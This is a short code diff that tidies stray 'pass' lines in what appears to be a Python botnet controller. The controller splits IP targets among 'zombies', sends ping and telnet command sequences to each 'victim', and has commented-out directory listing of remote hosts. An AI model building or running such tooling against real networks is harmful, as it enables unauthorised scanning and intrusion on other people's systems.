@@ -27,7 +27,6 @@ from commands.ping_combinations import ping_attack
 remote_sockets = []
 
 def exit_gracefully():
-    pass
 
     for remote_socket in remote_sockets:
         try:
@@ -133,9 +132,6 @@ def main():
 
             total_zombies = len(ip_addresses)
             targets_per_zombie = int(total_targets/total_zombies)
-    pass
-    pass
-    pass
 
             # Obtain the list of lists
             commands_list = scan_ping2(total_zombies, ecuador_ips, total_targets)
@@ -151,7 +147,6 @@ def main():
                     commands_seq = encode_commands(args.commands_list)  # This method comes from telnet_combinations.py
 
 
-    pass
                 ip_cont += 1
 
                 # Fetch the respective list with ping commands
@@ -177,7 +172,7 @@ def main():
 
     # Error case
     else:
-    pass
+        pass
 
 
 # Handle each victim
@@ -205,7 +200,6 @@ def handle_target(ip, port, command_sequence, timeout=2, detail=True):
     #response = socket_send_command(remote_socket, ping_command, False)
 
     #response = ls(remote_socket, "/")
-    pass
 
     #pseudo_tree(remote_socket, "/var", 3, log_output, log_paths)
     #pseudo_tree(remote_socket, "/tmp", 3, log_output, log_paths)
